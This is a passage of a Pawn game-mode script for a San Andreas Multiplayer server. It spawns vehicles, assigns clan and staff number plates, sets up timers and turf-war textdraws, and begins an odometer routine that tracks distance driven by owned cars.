	LMVeh[20] = AddStaticVehicle(541, 1277.5000, -2044.5000, 58.8000, 90.0000, 6, 6); SetVehicleNumberPlate(LMVeh[20], "LM 021");
	LMVeh[21] = AddStaticVehicle(541, 1277.5000, -2041.5000, 58.8000, 90.0000, 6, 6); SetVehicleNumberPlate(LMVeh[21], "LM 022");
	LMVeh[22] = AddStaticVehicle(541, 1277.5000, -2038.5000, 58.8000, 90.0000, 6, 6); SetVehicleNumberPlate(LMVeh[22], "LM 023");
	LMVeh[23] = AddStaticVehicle(451, 1277.5000, -2032.5000, 58.8000, 90.0000, 6, 6); SetVehicleNumberPlate(LMVeh[23], "LM 024");
	LMVeh[24] = AddStaticVehicle(451, 1277.5000, -2029.5000, 58.8000, 90.0000, 6, 6); SetVehicleNumberPlate(LMVeh[24], "LM 025");
	LMVeh[25] = AddStaticVehicle(451, 1277.5000, -2026.5000, 58.8000, 90.0000, 6, 6); SetVehicleNumberPlate(LMVeh[25], "LM 026");
	LMVeh[26] = AddStaticVehicle(495, 1246.0000, -2026.5000, 60.1600, -90.0000, 6, 6); SetVehicleNumberPlate(LMVeh[26], "LM 027");
	LMVeh[27] = AddStaticVehicle(495, 1246.0000, -2029.5000, 60.1600, -90.0000, 6, 6); SetVehicleNumberPlate(LMVeh[27], "LM 028");
	LMVeh[28] = AddStaticVehicle(495, 1246.0000, -2032.5000, 60.1600, -90.0000, 6, 6); SetVehicleNumberPlate(LMVeh[28], "LM 029");
	LMVeh[29] = AddStaticVehicle(409, 1261.4714, -2059.4966, 59.1200, -92.0000, 6, 6); SetVehicleNumberPlate(LMVeh[29], "LM 030");

    // Storm New Cars

    scar7 = AddStaticVehicleEx(522,2797.928710,-1095.866088,30.286569,286.779968,155,155,1200); // StormMen NRG
    scar8 = AddStaticVehicleEx(522,2797.730468,-1080.698730,30.290353,280.243377,155,155,1200); // StormMen NRG
    scar9 = AddStaticVehicleEx(522,2798.042236,-1078.804931,30.287548,266.925323,155,155,1200); // StormMen NRG
    scar10 = AddStaticVehicleEx(522,2807.962890,-1065.783935,29.816328,188.051574,155,155,1200); // StormMen NRG
    scar11 = AddStaticVehicleEx(560,2802.222900,-1064.894165,30.327459,178.527114,155,155,1200); // StormMen Sultan
    scar12 = AddStaticVehicleEx(559,2822.638427,-1081.906250,30.403171,181.096481,155,155,1200); // StormMen Jester
    scar13 = AddStaticVehicleEx(487,2798.985839,-1104.504394,94.376655,85.210845,155,155,1200); // StormMen Maverick
    scar14 = AddStaticVehicleEx(474,2808.056640,-1109.327514,30.482135,359.196685,155,155,1200); // StormMen Hermes
    scar15 = AddStaticVehicleEx(581,2801.688964,-1107.120483,30.456363,0.373776,155,155,1200); // StormMen Infer
    scar16 = AddStaticVehicleEx(522,2796.007568,-1093.017578,30.473440,271.011444,155,155,1200); // StormMen NRG
	// Hotel NEw Cars
	AddStaticVehicle(463,748.410034,-1277.600708,13.069140,170.150543,6,6);//Vehid:664 Title:freeway
	AddStaticVehicle(463,749.604736,-1277.214721,13.098680,175.277679,120,120);//Vehid:665 Title:BF-400
	AddStaticVehicle(522,729.389221,-1291.612915,13.132201,358.082733,2,2);//Vehid:666 Title:NRG

	tboy1 = AddStaticVehicle(560,-2773.735839,-312.632446,6.743822,1.341444,134,134);//Vehid:660 Title:sult
	tboy2 = AddStaticVehicle(522,-2786.703613,-280.588378,6.602642,181.395996,134,134);//Vehid:661 Title:nrg
	tboy3 = AddStaticVehicle(522,-2783.820556,-280.598754,6.611413,179.702224,134,134);//Vehid:663 Title:nrg
	tboy4 = AddStaticVehicle(560,-2771.051513,-312.625488,6.744263,359.352905,134,134);//Vehid:662 Title:sul
	tboy5 = AddStaticVehicle(522,-2781.263427,-280.354187,6.610637,180.735656,134,134);//Vehid:664 Title:nrg
	tboy6 = AddStaticVehicle(560,-2768.431152,-312.660644,6.743988,2.227129,134,134);//Vehid:665 Title:sult
	tboy7 = AddStaticVehicle(522,-2778.588378,-280.367614,6.601285,184.100341,134,134);//Vehid:666 Title:nrg
	tboy8 = AddStaticVehicle(522,-2776.329833,-280.287933,6.601140,184.599411,134,134);//Vehid:668 Title:nrg
	tboy9 = AddStaticVehicle(559,-2763.248291,-312.881958,6.691537,2.786197,134,134);//Vehid:669 Title:jest
	tboy11 = AddStaticVehicle(451,-2760.503417,-311.955474,6.745782,2.149910,134,134);//Vehid:670 Title:tur
	tboy12 = AddStaticVehicle(560,-2755.242919,-311.973388,6.766145,6.393226,134,134);//Vehid:658 Title:inf
	tboy13 = AddStaticVehicle(579,-2750.093261,-309.435028,6.968954,47.928867,134,134);//Vehid:672 Title:hunt
	tboy14 = AddStaticVehicle(579,-2747.150634,-306.371246,6.971893,46.517265,134,134);//Vehid:658 Title:huntl
	tboy15 = AddStaticVehicle(495,-2743.616455,-303.483459,7.365314,45.529663,134,134);//Vehid:674 Title:sandkin
	tboy16 = AddStaticVehicle(487,-2779.754394,-295.974273,7.215594,269.890258,134,134);//Vehid:673 Title:maverick
	tboy18 = AddStaticVehicle(581,-2774.029052,-280.292938,6.638627,182.485168,134,134);//Vehid:676 Title:bf-400
	tboy19 = AddStaticVehicle(581,-2771.682373,-280.361053,6.635396,180.991134,134,134);//Vehid:678 Title:bf-400
	tboy20 = AddStaticVehicle(487,-2759.912353,-296.174377,7.221946,272.337310,134,134);//Vehid:677 Title:maverick
	tboy21 = AddStaticVehicle(409,-2725.737060,-313.000335,6.910644,133.471923,134,134);//Vehid:684 Title:stret

	AddStaticVehicleEx(487, -1132.8143, -397.2505, 14.2856, 83.7600, -1, -1, 100);
	AddStaticVehicleEx(487, -1135.2987, -410.9203, 14.2893, 79.2000, -1, -1, 100);
	AddStaticVehicleEx(487, -1139.1367, -423.6510, 14.2488, 77.0400, -1, -1, 100);
	AddStaticVehicleEx(512, -1455.2583, -523.9425, 14.5936, 207.7200, -1, -1, 100);
	AddStaticVehicleEx(512, -1430.2864, -510.9466, 14.6632, -154.6200, -1, -1, 100);
	AddStaticVehicleEx(405, -1412.8057, -305.8697, 13.9114, 40.8000, -1, -1, 100);
	AddStaticVehicleEx(439, -1407.2080, -312.7343, 13.7851, 36.9600, -1, -1, 100);
	AddStaticVehicleEx(458, -1383.9766, -245.3145, 5.7435, 1.5000, -1, -1, 100);
	AddStaticVehicleEx(467, -1380.2809, -246.0585, 5.3313, 0.0000, -1, -1, 100);
	AddStaticVehicleEx(603, -1386.4933, -203.7219, 5.4987, 270.8998, -1, -1, 100);
	AddStaticVehicleEx(502, -1475.0057, -112.6676, 5.4312, -85.8000, -1, -1, 100);
	AddStaticVehicleEx(600, -1426.1327, -71.6837, 5.2249, 89.7600, -1, -1, 100);
	AddStaticVehicleEx(589, -1338.4218, -137.2858, 5.3095, 89.4600, -1, -1, 100);
	AddStaticVehicleEx(400, -1448.2717, -39.8750, 5.5445, 0.0000, -1, -1, 100);
	AddStaticVehicleEx(555, -1240.9005, 20.3580, 13.6805, -41.8200, -1, -1, 100);
	AddStaticVehicleEx(487, -1221.3368, -9.2664, 13.7257, 45.7800, -1, -1, 100);
	AddStaticVehicleEx(487, -1185.7594, 26.1937, 13.1310, 43.2600, -1, -1, 100);
	AddStaticVehicleEx(554, -1748.8804, -93.5025, 3.6992, 1.0800, -1, -1, 100);
	AddStaticVehicleEx(551, -1851.9575, -168.8585, 8.9267, -88.7400, -1, -1, 100);
	AddStaticVehicleEx(549, -1860.5972, -209.6509, 17.8649, -85.5000, -1, -1, 100);
	AddStaticVehicleEx(542, -1849.7070, 169.4410, 14.7798, -87.9000, -1, -1, 100);
	AddStaticVehicleEx(520, -1392.5630, 508.1759, 17.4415, -89.6400, -1, -1, 100);
	AddStaticVehicleEx(425, -1309.6018, 493.6800, 17.5053, -92.2200, -1, -1, 100);
	AddStaticVehicleEx(400, -1503.2692, 697.6713, 6.5457, 55.9200, -1, -1, 100);
	AddStaticVehicleEx(400, -1492.4523, 704.2457, 6.8719, 62.1600, -1, -1, 100);
	AddStaticVehicleEx(400, -1497.9773, 700.4063, 6.8719, 57.9000, -1, -1, 100);
	AddStaticVehicleEx(536, -1496.3762, 844.5641, 6.1428, 88.4400, -1, -1, 100);
	AddStaticVehicleEx(400, -1653.9974, 1209.0808, 20.8748, -98.8200, -1, -1, 100);
	AddStaticVehicleEx(533, -1644.8057, 1304.5026, 6.4241, 132.6000, -1, -1, 100);
	AddStaticVehicleEx(526, -1630.8656, 1290.0232, 6.0223, 134.5199, -1, -1, 100);
	AddStaticVehicleEx(522, -1648.4492, 1307.9286, 6.5856, 135.9000, -1, -1, 100);
	AddStaticVehicleEx(505, -1693.7144, 1340.4078, 7.4619, 132.7800, -1, -1, 100);
	AddStaticVehicleEx(446, -1507.5741, 1301.2202, -0.0234, 92.1600, -1, -1, 100);
	AddStaticVehicleEx(452, -1565.5912, 1262.4220, -0.0406, 91.5000, -1, -1, 100);
	AddStaticVehicleEx(452, -1896.8763, 1400.5233, 0.4833, -90.3600, -1, -1, 100);
	AddStaticVehicleEx(445, -2644.1536, 1333.0717, 6.0070, 272.6400, -1, -1, 100);
	AddStaticVehicleEx(466, -2643.5056, 1341.2031, 6.2551, 275.5801, -1, -1, 100);
	AddStaticVehicleEx(439, -2643.0769, 1347.4689, 6.4784, -84.4800, -1, -1, 100);
	AddStaticVehicleEx(453, -2952.7620, 498.9873, -0.0262, 0.0000, -1, -1, 100);
	AddStaticVehicleEx(453, -2982.2100, 498.1478, 0.4716, 0.0000, -1, -1, 100);
	AddStaticVehicleEx(445, -2766.8982, 762.8287, 52.4344, 90.0000, -1, -1, 100);
	AddStaticVehicleEx(453, -2411.7539, 2313.3691, -0.0234, -175.2000, -1, -1, 100);
	AddStaticVehicleEx(487, -2228.9548, 2326.6348, 6.4988, 0.0000, -1, -1, 100);
	AddStaticVehicleEx(576, -2253.2346, 2285.0225, 3.9333, 88.6200, -1, -1, 100);
	AddStaticVehicleEx(480, -2253.1086, 2302.8127, 4.7145, 85.3800, -1, -1, 100);
	AddStaticVehicleEx(412, -2271.2681, 2288.4170, 4.5213, -90.2400, -1, -1, 100);
	AddStaticVehicleEx(442, -2253.1128, 2320.8643, 4.5249, 91.0200, -1, -1, 100);
	AddStaticVehicleEx(452, -2253.6055, 2429.3669, -0.0449, -135.7200, -1, -1, 100);
	AddStaticVehicleEx(454, -2233.7539, 2450.8462, 1.0733, -137.2800, -1, -1, 100);
	AddStaticVehicleEx(400, -2544.7471, 2368.4797, 3.9506, -89.9400, -1, -1, 100);
	AddStaticVehicleEx(468, -2628.7268, 2249.3010, 7.1962, 0.0000, -1, -1, 100);
	AddStaticVehicleEx(468, -2626.8274, 2249.4844, 7.5424, 0.0000, -1, -1, 100);
	AddStaticVehicleEx(468, -2624.9155, 2249.9082, 7.8392, 0.0000, -1, -1, 100);
	AddStaticVehicleEx(475, -2611.9778, 2250.1814, 8.1803, 0.0000, -1, -1, 100);
	AddStaticVehicleEx(436, -2436.8867, 2454.5015, 12.7515, -179.8800, -1, -1, 100);
	AddStaticVehicleEx(429, -2526.1685, 1229.3064, 36.7061, -148.2600, -1, -1, 100);
	AddStaticVehicleEx(421, -2534.4526, 1228.8790, 36.9304, -149.1000, -1, -1, 100);
	AddStaticVehicleEx(401, -2362.2908, 1246.2241, 29.7465, 0.9600, -1, -1, 100);
	AddStaticVehicleEx(400, -2794.7954, 1316.8884, 6.8668, -171.2399, -1, -1, 100);
	AddStaticVehicleEx(404, -2891.4417, 504.8852, 3.7894, -183.2999, -1, -1, 100);
	AddStaticVehicleEx(480, -1751.3976, 956.2107, 24.2044, -87.6000, -1, -1, 100);
	AddStaticVehicleEx(421, -1736.0599, 1028.2081, 16.8031, -92.4600, -1, -1, 100);
	AddStaticVehicleEx(522, -2158.7075, -406.7446, 34.3194, 48.3600, -1, -1, 100);
	AddStaticVehicleEx(603, -2193.0911, -418.9841, 34.9804, -53.7600, -1, -1, 100);
	AddStaticVehicleEx(602, -2187.6665, -424.5479, 35.2553, -55.5000, -1, -1, 100);
	AddStaticVehicleEx(602, -2505.6521, -602.5627, 131.8659, -179.2200, -1, -1, 100);
	AddStaticVehicleEx(580, -2498.0254, -602.8311, 132.0044, -180.1200, -1, -1, 100);
	AddStaticVehicleEx(560, -2758.7852, -167.9759, 6.4024, -1.0200, -1, -1, 100);
	AddStaticVehicleEx(561, -2756.1282, -50.4117, 6.2925, 0.0000, -1, -1, 100);
	AddStaticVehicleEx(580, -2654.3223, -138.0905, 3.6045, 0.0000, -1, -1, 100);
	AddStaticVehicleEx(560, -2656.6570, -55.3163, 3.3064, 0.0000, -1, -1, 100);
	AddStaticVehicleEx(500, -2637.3528, -54.9181, 5.0993, 0.0000, -1, -1, 100);
	AddStaticVehicleEx(410, -2624.5752, -34.6980, 3.7990, -180.6000, -1, -1, 100);
	AddStaticVehicleEx(510, -2669.3811, 88.7741, 3.0839, -92.2200, -1, -1, 100);
	AddStaticVehicleEx(412, -2651.3977, 111.4636, 3.8408, 0.0000, -1, -1, 100);
	AddStaticVehicleEx(603, -2664.8589, 267.9479, 3.3052, 0.0000, -1, -1, 100);
	AddStaticVehicleEx(602, -2674.9087, 267.9467, 3.9148, 0.0000, -1, -1, 100);
	AddStaticVehicleEx(409, -2754.5515, 374.7494, 3.3251, 0.0000, -1, -1, 100);
	AddStaticVehicleEx(415, -2483.8213, 5.9628, 24.5857, 89.1000, -1, -1, 100);
	AddStaticVehicleEx(419, -2484.5745, -164.0043, 24.6054, 90.8400, -1, -1, 100);
	AddStaticVehicleEx(529, -2687.5662, 586.6699, 13.8808, 0.0000, -1, -1, 100);
	AddStaticVehicleEx(415, -2455.8826, 740.4550, 33.9963, -181.0800, -1, -1, 100);
	AddStaticVehicleEx(421, -2442.8884, 740.9235, 33.9931, -179.4000, -1, -1, 100);
	AddStaticVehicleEx(426, -2592.3071, 660.5733, 26.9646, -94.7400, -1, -1, 100);
	AddStaticVehicleEx(429, -2563.3484, 627.7506, 27.7271, 0.0000, -1, -1, 100);
	AddStaticVehicleEx(436, -2544.2607, 598.8878, 13.3797, 91.0200, -1, -1, 100);
	AddStaticVehicleEx(439, -2335.4995, 991.0202, 49.6466, 87.6000, -1, -1, 100);
	AddStaticVehicleEx(458, -2435.1978, 991.7847, 44.2627, -91.2600, -1, -1, 100);
	AddStaticVehicleEx(466, -2240.9636, 549.8914, 34.0830, 86.5200, -1, -1, 100);
	AddStaticVehicleEx(475, -2425.9011, 518.3177, 28.9018, -142.2000, -1, -1, 100);
	AddStaticVehicleEx(474, -2418.8145, 524.8636, 29.5533, -127.7400, -1, -1, 100);
	AddStaticVehicleEx(475, -2031.5828, 144.0403, 28.3771, 0.0000, -1, -1, 100);
	AddStaticVehicleEx(466, -2035.2858, 170.3851, 27.8253, -90.1800, -1, -1, 100);
	AddStaticVehicleEx(480, -1911.4801, 282.7889, 40.3114, -178.9200, -1, -1, 100);
	AddStaticVehicleEx(506, -1989.2448, 275.1159, 34.1127, -91.1400, -1, -1, 100);
	AddStaticVehicleEx(518, -2184.0317, 293.5064, 34.0763, 0.0000, -1, -1, 100);
	AddStaticVehicleEx(516, -2214.1360, 306.0663, 34.4363, -181.8601, -1, -1, 100);
	AddStaticVehicleEx(496, -1996.8839, 494.3163, 34.1268, 0.0000, -1, -1, 100);
	AddStaticVehicleEx(500, -2110.5972, 573.3754, 33.9730, 92.7600, -1, -1, 100);
	AddStaticVehicleEx(492, -1840.8538, 543.1236, 34.1075, 54.8400, -1, -1, 100);
	AddStaticVehicleEx(505, -2134.6538, 766.1055, 68.5012, 0.0000, -1, -1, 100);
	AddStaticVehicleEx(533, -1977.8290, 910.9547, 44.2519, -95.5200, -1, -1, 100);
	AddStaticVehicleEx(535, -2069.9619, 967.3730, 59.8224, -157.5000, -1, -1, 100);
	AddStaticVehicleEx(540, -1961.7913, 1100.1359, 54.6861, 0.0000, -1, -1, 100);
	AddStaticVehicleEx(400, -1786.7021, 1085.9623, 44.4230, 0.0000, -1, -1, 100);
	AddStaticVehicleEx(400, -1706.6578, 1057.3035, 44.0442, 0.0000, -1, -1, 100);
	AddStaticVehicleEx(545, -1754.4758, 833.0639, 23.8016, -92.5800, -1, -1, 100);
	AddStaticVehicleEx(545, -1950.4939, 724.1393, 44.2453, -89.8200, -1, -1, 100);
	AddStaticVehicleEx(400, -2134.7820, 673.5593, 61.3081, 0.0000, -1, -1, 100);
	AddStaticVehicleEx(542, -2274.1345, 893.3752, 65.4337, -179.5800, -1, -1, 100);
	AddStaticVehicleEx(400, -2265.6619, 192.7082, 34.0981, -270.4200, -1, -1, 100);
	AddStaticVehicleEx(540, -2266.0125, 204.4139, 34.1541, 90.7200, -1, -1, 100);
	AddStaticVehicleEx(540, -2266.5645, 105.4615, 34.1071, 87.8400, -1, -1, 100);

	// storm new cars
 scar17 = AddStaticVehicleEx(560,2806.902343,-1089.016479,30.464166,0.212141,155,155,1200);//Vehid:829 Title:InferStrmAdd


tcc7 = AddStaticVehicleEx(487,841.237792,-1209.951293,17.109947,267.526306,1,102,900);//Vehid:911 Title:TCCHel

	AddStaticVehicle(538, -1943.0624, 158.9263, 25.7186, 358.2109, 3, 252);
    //theend
    //-------[CAR PLATS]--------------------------------------------------------
    SetVehicleNumberPlate(stfcar, "Staff Car");
    SetVehicleNumberPlate(stfcar1, "Staff Car");
    SetVehicleNumberPlate(stfcar2, "Staff Car");
    SetVehicleNumberPlate(stfcar3, "Staff Car");
    SetVehicleNumberPlate(stfcar4, "Staff Car");
    SetVehicleNumberPlate(stfcar5, "Staff Car");
    SetVehicleNumberPlate(stfcar6, "Staff Car");
    SetVehicleNumberPlate(stfcar7, "Staff Car");
    SetVehicleNumberPlate(stfcar8, "Staff Car");
    SetVehicleNumberPlate(stfcar9, "Staff Car");
    SetVehicleNumberPlate(stfcar10, "Staff Car");
    SetVehicleNumberPlate(stfcar11, "Staff Car");
    SetVehicleNumberPlate(stfcar12, "Staff Car");
    SetVehicleNumberPlate(stfcar13, "Staff Car");
    SetVehicleNumberPlate(stfcar14, "Staff Car");
    SetVehicleNumberPlate(stfcar15, "Staff Car");
    SetVehicleNumberPlate(stfcar16, "Staff Car");
    SetVehicleNumberPlate(stfcar17, "Staff Car");
    SetVehicleNumberPlate(stfcar18, "Staff Car");
    SetVehicleNumberPlate(stfcar19, "Staff Car");
    SetVehicleNumberPlate(stfcar20, "Staff Car");
    SetVehicleNumberPlate(stfcar21, "Staff Car");
    SetVehicleNumberPlate(stfcar21, "Staff Car");
    SetVehicleNumberPlate(stfcar22, "Staff Car");
    SetVehicleNumberPlate(stfcar23, "Staff Car");
    SetVehicleNumberPlate(stfcar24, "Staff Car");
    SetVehicleNumberPlate(stfcar25, "Staff Car");
    SetVehicleNumberPlate(stfcar26, "Staff Car");
    SetVehicleNumberPlate(stfcar27, "Staff Car");
    SetVehicleNumberPlate(stfcar28, "Staff Car");
    SetVehicleNumberPlate(stfcar29, "Staff Car");
    SetVehicleNumberPlate(stfcar30, "Staff Car");
    SetVehicleNumberPlate(stfcar31, "Staff Car");
    SetVehicleNumberPlate(stfcar32, "Staff Car");
    SetVehicleNumberPlate(stfcar33, "Staff Car");
    SetVehicleNumberPlate(stfcar34, "Staff Car");
    SetVehicleNumberPlate(stfcar35, "Staff Car");
    SetVehicleNumberPlate(ttcar, "JG Clan Car");
    SetVehicleNumberPlate(ttcar1, "JG Clan Car");
    SetVehicleNumberPlate(ttcar2, "JG Clan Car");
    SetVehicleNumberPlate(ttcar3, "JG Clan Car");
    SetVehicleNumberPlate(ttcar4, "JG Clan Car");
    SetVehicleNumberPlate(ttcar5, "JG Clan Car");
    SetVehicleNumberPlate(ttcar6, "JG Clan Car");
    SetVehicleNumberPlate(ttcar7, "JG Clan Car");
    SetVehicleNumberPlate(ttcar8, "JG Clan Car");
    SetVehicleNumberPlate(ttcar9, "JG Clan Car");
    SetVehicleNumberPlate(ttcar10, "JG Clan Car");
    SetVehicleNumberPlate(ttcar11, "JG Clan Car");
    SetVehicleNumberPlate(ttcar12, "JG Clan Car");
    SetVehicleNumberPlate(ttcar13, "JG Clan Car");
    SetVehicleNumberPlate(ttcar14, "JG Clan Car");
    SetVehicleNumberPlate(ttcar15, "JG Clan Car");
// Evil Car Pelak

    SetVehicleNumberPlate(evcar, "Evil Clan Car");
    SetVehicleNumberPlate(evcar1, "Evil Clan Car");
    SetVehicleNumberPlate(evcar2, "Evil Clan Car");
    SetVehicleNumberPlate(evcar3, "Evil Clan Car");
    SetVehicleNumberPlate(evcar4, "Evil Clan Car");
    SetVehicleNumberPlate(evcar5, "Evil Clan Car");
    SetVehicleNumberPlate(evcar6, "Evil Clan Car");
    SetVehicleNumberPlate(evcar7, "Evil Clan Car");
    SetVehicleNumberPlate(evcar8, "Evil Clan Car");
    SetVehicleNumberPlate(evcar9, "Evil Clan Car");
    SetVehicleNumberPlate(evcar10, "Evil Clan Car");
    SetVehicleNumberPlate(evcar11, "Evil Clan Car");
    SetVehicleNumberPlate(evcar12, "Evil Clan Car");

// GG Car Plak
    SetVehicleNumberPlate(ggcar, "GG Clan Car");
    SetVehicleNumberPlate(ggcar1, "GG Clan Car");
    SetVehicleNumberPlate(ggcar2, "GG Clan Car");
    SetVehicleNumberPlate(ggcar3, "GG Clan Car");
    SetVehicleNumberPlate(ggcar4, "GG Clan Car");
    SetVehicleNumberPlate(ggcar5, "GG Clan Car");
    SetVehicleNumberPlate(ggcar6, "GG Clan Car");
    SetVehicleNumberPlate(ggcar7, "GG Clan Car");
    SetVehicleNumberPlate(ggcar8, "GG Clan Car");
    SetVehicleNumberPlate(ggcar9, "GG Clan Car");
    SetVehicleNumberPlate(ggcar10, "GG Clan Car");
    SetVehicleNumberPlate(ggcar11, "GG Clan Car");
    SetVehicleNumberPlate(ggcar12, "GG Clan Car");
    SetVehicleNumberPlate(ggcar13, "GG Clan Car");
    SetVehicleNumberPlate(ggcar14, "GG Clan Car");
    SetVehicleNumberPlate(ggcar15, "GG Clan Car");
    SetVehicleNumberPlate(ggcar16, "GG Clan Car");
    SetVehicleNumberPlate(ggcar17, "GG Clan Car");
    SetVehicleNumberPlate(ggcar18, "GG Clan Car");
    SetVehicleNumberPlate(ggcar19, "GG Clan Car");
    SetVehicleNumberPlate(ggcar20, "GG Clan Car");
    SetVehicleNumberPlate(ggcar21, "GG Clan Car");
    SetVehicleNumberPlate(ggcar22, "GG Clan Car");
    SetVehicleNumberPlate(ggcar23, "GG Clan Car");
    SetVehicleNumberPlate(ggcar24, "GG Clan Car");
	//
    SetVehicleNumberPlate(tboy1, "The Racers Car");
    SetVehicleNumberPlate(tboy2, "The Racers Car");
    SetVehicleNumberPlate(tboy3, "The Racers Car");
    SetVehicleNumberPlate(tboy4, "The Racers Car");
    SetVehicleNumberPlate(tboy5, "The Racers Car");
    SetVehicleNumberPlate(tboy6, "The Racers Car");
    SetVehicleNumberPlate(tboy7, "The Racers Car");
    SetVehicleNumberPlate(tboy8, "The Racers Car");
    SetVehicleNumberPlate(tboy9, "The Racers Car");
    SetVehicleNumberPlate(tboy11, "The Racers Car");
    SetVehicleNumberPlate(tboy12, "The Racers Car");
    SetVehicleNumberPlate(tboy13, "The Racers Car");
    SetVehicleNumberPlate(tboy14, "The Racers Car");
    SetVehicleNumberPlate(tboy15, "The Racers Car");
    SetVehicleNumberPlate(tboy16, "The Racers Car");
    SetVehicleNumberPlate(tboy18, "The Racers Car");
    SetVehicleNumberPlate(tboy19, "The Racers Car");
    SetVehicleNumberPlate(tboy20, "The Racers Car");
    SetVehicleNumberPlate(tboy21, "The Racers Car");
    SetVehicleNumberPlate(tcc1, "TCC 005");
    SetVehicleNumberPlate(tcc2, "TCC 101");
    SetVehicleNumberPlate(tcc3, "TCC 118");
    SetVehicleNumberPlate(tcc4, "TCC 121");
    SetVehicleNumberPlate(tcc5, "TCC 080");
    SetVehicleNumberPlate(tcc6, "TCC 201");
    SetVehicleNumberPlate(ExamVeh[0], "EXAM 001");
    SetVehicleNumberPlate(ExamVeh[1], "EXAM 002");
    SetVehicleNumberPlate(ExamVeh[2], "EXAM 003");
    SetVehicleNumberPlate(ExamVeh[3], "EXAM 004");
    SetVehicleNumberPlate(ExamVeh[4], "EXAM 005");
    SetVehicleNumberPlate(ExamVeh[5], "EXAM 006");
    SetVehicleNumberPlate(ExamVeh[6], "EXAM 007");
    new tmphour;
    new tmpminute;
    new tmpsecond;
    gettime(tmphour, tmpminute, tmpsecond);
    FixHour(tmphour);
    tmphour = shifthour;
    SetWorldTime(tmphour);
    SetTimer("SyncUp", 60000, 1);
    SetTimer("SetPlayerUnjail", 1000, 1);
    SetTimer("OtherTimer", 1000, 1);
    SetTimer("CustomPickups", 1000, 1);
    SetTimer("SaveAccounts", 300000, 1); //5 minutes everyaccounts save
    SetTimer("SPeedKm",10, 1);
    SetTimer("benzinkamkon", 1000, true);
    SetTimer("kiloezafkon",1000, true);
    ReadAccountBar();
	LoadPlayerTextdraws();
	jscar[1] = AddStaticVehicleEx(418,1655.8105,-1835.9249,13.6401,90.7013,13,13,900);
	jscar[2] = AddStaticVehicleEx(418,1657.2865,-1820.5325,13.6411,90.6571,13,13,900);
	jscar[3] = AddStaticVehicleEx(418,1656.8549,-1807.1617,13.6402,92.0175,13,13,900);
	jscar[4] = AddStaticVehicleEx(418,1599.2046,-1791.6375,13.4496,262.1764,13,13,900);

WarBox = TextDrawCreate(626.500000, 237.322219, "usebox");
TextDrawLetterSize(WarBox , 0.000000, 20.977161);
TextDrawTextSize(WarBox , 414.000000, 0.000000);
TextDrawAlignment(WarBox , 1);
TextDrawColor(WarBox , 0);
TextDrawUseBox(WarBox , true);
TextDrawBoxColor(WarBox , 102);
TextDrawSetShadow(WarBox , 0);
TextDrawSetOutline(WarBox , 0);
TextDrawFont(WarBox , 0);
TextDrawSetProportional(WarBox , 1);







WarVS = TextDrawCreate(511.000000, 355.910888, "VS");
TextDrawLetterSize(WarVS , 0.556499, 2.732442);
TextDrawTextSize(WarVS , 0.000000, 0.000000);
TextDrawAlignment(WarVS , 1);
TextDrawColor(WarVS , -16776961);
TextDrawSetShadow(WarVS , 0);
TextDrawSetOutline(WarVS , 0);
TextDrawFont(WarVS , 3);
TextDrawSetProportional(WarVS , 1);

for(new turf=0;turf<50;turf++) {

WarA[turf] = TextDrawCreate(439.500000, 334.755523, "None");
TextDrawLetterSize(WarA[turf] , 0.514499, 2.122665);
TextDrawTextSize(WarA[turf] , 0.000000, 0.000000);
TextDrawAlignment(WarA[turf] , 1);
TextDrawColor(WarA[turf] , -1);
TextDrawSetShadow(WarA[turf] , 0);
TextDrawSetOutline(WarA[turf] , 1);
TextDrawFont(WarA[turf] , 3);
TextDrawSetProportional(WarA[turf] , 1);

WarTR[turf] = TextDrawCreate(421.000000, 289.333343, "Time_Remaining:_None");
TextDrawLetterSize(WarTR[turf] , 0.244500, 1.587555);
TextDrawTextSize(WarTR[turf] , 0.000000, 0.000000);
TextDrawAlignment(WarTR[turf] , 1);
TextDrawColor(WarTR[turf] , -1);
TextDrawSetShadow(WarTR[turf] , 0);
TextDrawSetOutline(WarTR[turf] , 1);
TextDrawFont(WarTR[turf] , 2);
TextDrawSetProportional(WarTR[turf] , 1);

WarD[turf] = TextDrawCreate(442.000000, 384.533264, "None");
TextDrawLetterSize(WarD[turf] , 0.505500, 2.321776);
TextDrawTextSize(WarD[turf] , 0.000000, 0.000000);
TextDrawAlignment(WarD[turf] , 1);
TextDrawColor(WarD[turf] , -1);
TextDrawSetShadow(WarD[turf] , 0);
TextDrawSetOutline(WarD[turf] , 1);
TextDrawFont(WarD[turf] , 3);
TextDrawSetProportional(WarD[turf] , 1);

}
    return 1;
}
forward kiloezafkon();
public kiloezafkon()
{
    for(new i = 0; i < LastPID; i++)
    {
        if(IsPlayerConnected(i) && GetPlayerState(i) == PLAYER_STATE_DRIVER && OwnedMashin[GetPlayerVehicleID(i)] == 1)
        {
            new veh = GetPlayerVehicleID(i);
            new speed = soratbegirs(veh);
            if(speed > 0 && speed <= 20)
            {
                PlayerInfo[MashinOwner[veh]][cKilo] += 0.011;
            }
            if(speed > 20 && speed <= 50)
            {
                PlayerInfo[MashinOwner[veh]][cKilo] += 0.055;
            }
            if(speed > 50 && speed <= 100)
            {
                PlayerInfo[MashinOwner[veh]][cKilo] += 0.088;
            }
            if(speed > 100 && speed <= 180)
            {
                PlayerInfo[MashinOwner[veh]][cKilo] += 0.115;
            }
            if(speed > 180)
            {
                PlayerInfo[MashinOwner[veh]][cKilo] += 0.122;
            }
            SaveKonFloat(MashinOwner[veh], "cKilo", PlayerInfo[MashinOwner[veh]][cKilo]);
            new string[256];
            format(string,sizeof(string),"Odometer: %.2f Km", PlayerInfo[MashinOwner[veh]][cKilo]);
            TextDrawSetString(KiloTextDraw[i], string);
        }
        else if(IsPlayerConnected(i) && GetPlayerState(i) == PLAYER_STATE_DRIVER && OwnedMashin_2[GetPlayerVehicleID(i)] == 1)
        {
            new veh = GetPlayerVehicleID(i);
            new speed = soratbegirs(veh);
            if(speed > 0 && speed <= 20)
            {
                PlayerInfo[MashinOwner_2[veh]][cKilo_2] += 0.011;
            }
            if(speed > 20 && speed <= 50)
            {
                PlayerInfo[MashinOwner_2[veh]][cKilo_2] += 0.055;
            }
            if(speed > 50 && speed <= 100)
            {
                PlayerInfo[MashinOwner_2[veh]][cKilo_2] += 0.088;
            }
            if(speed > 100 && speed <= 180)
            {
                PlayerInfo[MashinOwner_2[veh]][cKilo_2] += 0.115;
            }
            if(speed > 180)
            {
                PlayerInfo[MashinOwner_2[veh]][cKilo_2] += 0.152;
            }
            SaveKonFloat(MashinOwner_2[veh], "cKilo_2", PlayerInfo[MashinOwner_2[veh]][cKilo_2]);
            new string[256];
